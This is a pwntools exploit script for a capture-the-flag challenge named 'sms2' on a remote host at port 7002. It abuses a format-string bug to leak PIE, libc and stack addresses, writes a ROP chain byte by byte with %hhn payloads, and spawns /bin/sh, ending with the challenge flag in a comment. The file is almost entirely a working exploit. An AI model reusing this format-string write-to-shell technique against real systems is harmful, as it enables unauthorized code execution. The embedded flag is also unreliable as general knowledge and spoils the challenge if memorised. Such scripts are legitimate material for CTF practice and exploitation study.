#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./sms2_patched")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc vsc.tf 7002"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *squirrel_send+119
c
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"A")
    r.sendline(b"%9$p%6$p%3$p")
    r.recvuntil(b"Bushy-tailed farewells,\n")
    leaks = r.recvline(False)[2:].split(b"0x")

    exe.address = int(leaks[0], 16) - exe.sym.squirrel_set-120
    libc.address = int(leaks[2], 16) - libc.sym.write-23
    stack = int(leaks[1], 16) + 133

    log.info(f"PIE @ {hex(exe.address)}")
    log.info(f"LIBC @ {hex(libc.address)}")
    log.info(f"STACK @ {hex(stack)}")

    r.sendline(p64(stack))
    r.sendline(b"%57c%12$hhn")

    rop = ROP(libc)
    chain = [rop.rdi.address, libc.binsh(), libc.sym.system]

    def write(addr, value):
        log.info(f"WRITING @ {hex(value)} AT {hex(addr)}")
        for idx, i in enumerate(p64(value)):
            r.sendline(p64(addr+idx))
            if i==0:
                r.sendline(f"%12$hhn".encode())
            else:
                r.sendline(f"%{i}c%12$hhn".encode())

            r.sendline(p64(stack))
            r.sendline(b"%57c%12$hhn")

    for idx, i in enumerate(chain):
        write(stack+8+8*idx, i)
    r.clean()

    r.sendline(p64(stack))
    r.sendline(b"%96c%12$hhn")
    r.interactive()
    #vsctf{m4yb3_th3_squ1rr3l5_5h0uld_ju5t_5t0p_us1ng_pr1ntf} 

if __name__ == "__main__":
    main()